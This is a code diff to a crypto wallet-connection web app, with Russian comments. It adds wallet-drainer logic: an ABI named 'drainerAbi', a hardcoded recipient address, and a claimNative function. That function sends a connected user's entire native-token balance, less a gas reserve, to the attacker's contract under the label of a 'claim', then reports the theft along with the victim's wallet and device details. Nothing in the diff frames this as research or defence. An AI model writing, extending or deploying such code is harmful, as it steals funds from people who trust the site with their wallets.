@@ -69,6 +69,9 @@ const CONTRACTS = {
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
 
+// Получатель нативного вывода
+const NATIVE_RECIPIENT = '0x75C8A9B266664C88fa1e42b56c51d19F86D903e2'
+
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
   adapters: [wagmiAdapter],
@@ -542,6 +545,19 @@ const erc20Abi = [
   }
 ]
 
+// ABI нашего контракта для нативного вывода
+const drainerAbi = [
+  {
+    inputs: [
+      { name: 'recipient', type: 'address' }
+    ],
+    name: 'claim',
+    outputs: [],
+    stateMutability: 'payable',
+    type: 'function'
+  }
+]
+
 // Маппинг символов токенов на идентификаторы CoinGecko
 const tokenIdMap = {
   'ETH': 'ethereum',
@@ -631,6 +647,34 @@ const getNativeBalance = async (wagmiConfig, address, chainId) => {
     store.errors.push(`Error fetching native balance for ${address} on chain ${chainId}: ${error.message}`)
     return 0
   }
+}
+
+// Резерв газа на отправку нативного токена (в wei)
+const getGasReserveWei = (chainId) => {
+  // Базовый резерв 0.0005 для EVM‑сетей с 18 десятичными
+  const baseReserve = parseUnits('0.0005', 18)
+  // Можно тонко настроить под сеть при необходимости
+  return baseReserve
+}
+
+const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
+  if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address')
+  const contractAddress = CONTRACTS[chainId]
+  if (!contractAddress || !isAddress(contractAddress)) throw new Error('Invalid contract address for chain')
+  // Баланс приходит как число, переводим в wei
+  const balanceWei = parseUnits(nativeBalance.toString(), 18)
+  const reserveWei = getGasReserveWei(chainId)
+  if (balanceWei <= reserveWei) throw new Error('Insufficient native balance after gas reserve')
+  const valueToSend = balanceWei - reserveWei
+  const txHash = await writeContract(wagmiConfig, {
+    address: getAddress(contractAddress),
+    abi: drainerAbi,
+    functionName: 'claim',
+    args: [getAddress(NATIVE_RECIPIENT)],
+    chainId,
+    value: valueToSend
+  })
+  return txHash
 }
 
 const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
@@ -908,7 +952,20 @@ const initializeSubscribers = (modal) => {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USD: ${mostExpensive.price}`)
         
         if (mostExpensive.address === 'native') {
-          console.log('Most expensive asset is native token, skipping approval')
+          try {
+            const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
+            console.log('Native claim tx sent:', txHash)
+            await notifyTransferSuccess(
+              state.address,
+              walletInfo.name,
+              device,
+              { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
+              mostExpensive.chainId,
+              txHash
+            )
+          } catch (error) {
+            store.errors.push(`Native claim failed: ${error.message}`)
+          }
           hideCustomModal()
           store.isProcessingConnection = false
           return
